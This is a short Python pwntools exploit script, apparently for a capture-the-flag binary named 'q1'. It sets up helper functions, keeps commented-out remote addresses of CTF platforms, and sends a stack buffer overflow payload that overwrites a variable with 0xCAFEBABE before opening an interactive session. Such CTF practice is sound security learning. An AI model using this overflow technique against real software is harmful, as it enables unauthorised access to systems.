import time
from pwn import *
from LibcSearcher import *
from ctypes import *

# io = remote("192.168.170.128", 9997)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
# io = remote("node4.anna.nssctf.cn", 28912)
io = process('./q1')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./q1')
# libc = ELF('./libc-2.23.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)


# context(os='linux', arch='amd64')
context(os='linux', arch='i386', log_level="debug")

i =  0x12345678
key = 0xCAFEBABE

payload = b'a' * 0x20 + p32(i)
payload = payload.ljust(0x2c + 4, b'\x00')
payload += p32(key)

sl(payload)

inter()
